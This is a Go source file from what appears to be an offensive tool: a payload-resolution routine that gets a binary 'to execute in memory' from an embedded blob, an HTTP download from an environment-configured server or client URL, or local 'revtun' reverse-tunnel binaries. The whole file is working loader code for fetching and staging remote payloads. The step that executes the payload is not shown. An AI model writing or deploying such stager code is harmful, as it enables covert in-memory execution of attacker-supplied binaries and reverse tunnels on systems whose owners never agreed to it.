package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

// Default embedded or bundled payload binary
var embeddedPayload []byte

// GetPayload resolves the binary payload to execute in memory
func GetPayload(cfg *Config, env *EnvConfig) ([]byte, error) {
	// 1. If embedded payload is present, use it directly
	if len(embeddedPayload) > 0 {
		return embeddedPayload, nil
	}

	// 2. Check for configured download URL from environment variables
	targetURL := ""
	if cfg.Mode == "server" && env.ServerURL != "" {
		targetURL = env.ServerURL
	} else if cfg.Mode == "client" && env.ClientURL != "" {
		targetURL = env.ClientURL
	}

	if targetURL != "" {
		payload, err := downloadPayload(targetURL)
		if err == nil && len(payload) > 0 {
			return payload, nil
		}
	}

	// 3. Check for local payload binary in working directory or parent directories
	binaryCandidates := []string{
		"revtun",
		"revtun.exe",
		"../revtun",
		"../revtun.exe",
		filepath.Join(".", "dist", "revtun"),
		filepath.Join(".", "dist", "revtun.exe"),
	}

	if runtime.GOOS == "windows" {
		binaryCandidates = append([]string{"revtun.exe", "../revtun.exe"}, binaryCandidates...)
	}

	for _, path := range binaryCandidates {
		if data, err := os.ReadFile(path); err == nil && len(data) > 0 {
			return data, nil
		}
	}

	return nil, fmt.Errorf("no executable payload binary found (searched candidate paths and environment URLs)")
}

// downloadPayload fetches binary payload via HTTP with timeout
func downloadPayload(rawURL string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return nil, fmt.Errorf("invalid download URL: %w", err)
	}

	client := &http.Client{
		Timeout: 60 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("download request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server responded with status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed reading payload body: %w", err)
	}

	return data, nil
}

